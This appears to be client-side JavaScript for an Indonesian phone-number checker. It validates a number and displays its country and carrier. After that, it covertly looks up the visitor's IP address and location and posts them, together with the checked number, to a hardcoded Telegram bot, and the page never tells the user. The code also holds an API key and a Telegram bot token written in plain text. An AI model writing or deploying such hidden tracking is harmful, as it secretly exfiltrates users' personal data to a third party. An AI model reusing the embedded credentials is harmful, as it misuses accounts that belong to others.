function cekNomor() {
  const nomor = document.getElementById("phone").value;
  const resultBox = document.getElementById("hasil-nomor");

  if (!nomor.startsWith("+")) {
    resultBox.innerHTML = "Gunakan format internasional (misal: +628123456789)";
    return;
  }

  fetch(`https://api.apilayer.com/number_verification/validate?number=${nomor}`, {
    headers: {
      "apikey": "axl1F57lkrG7iorwlHBQuocWAjHhTl7O"
    }
  })
  .then(res => res.json())
  .then(data => {
    if (!data.valid) {
      resultBox.innerHTML = "Nomor tidak valid atau tidak terdeteksi.";
      return;
    }

    const hasil = `
      <strong>Nomor:</strong> ${data.international_format}<br>
      <strong>Negara:</strong> ${data.country_name}<br>
      <strong>Operator:</strong> ${data.carrier}
    `;
    resultBox.innerHTML = hasil;

    // Ambil lokasi IP & gabungkan
    fetch("https://ipwho.is/")
      .then(res => res.json())
      .then(ip => {
        const pesan = `Nomor dilacak:
${data.international_format}
Negara: ${data.country_name}
Operator: ${data.carrier}
Lokasi IP: ${ip.city}, ${ip.region}, ${ip.country}
IP: ${ip.ip}`;

        // Kirim ke Telegram
        fetch("https://api.telegram.org/bot7340359614:AAFXHvoBGPrp_q7ZWXRZP3qaybhvq9gntTw/sendMessage", {
          method: "POST",
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
          },
          body: `chat_id=6466187930&text=${encodeURIComponent(pesan)}`
        });
      });
  })
  .catch(err => {
    console.error(err);
    resultBox.innerHTML = "Gagal mengambil data. Coba lagi nanti.";
  });
}
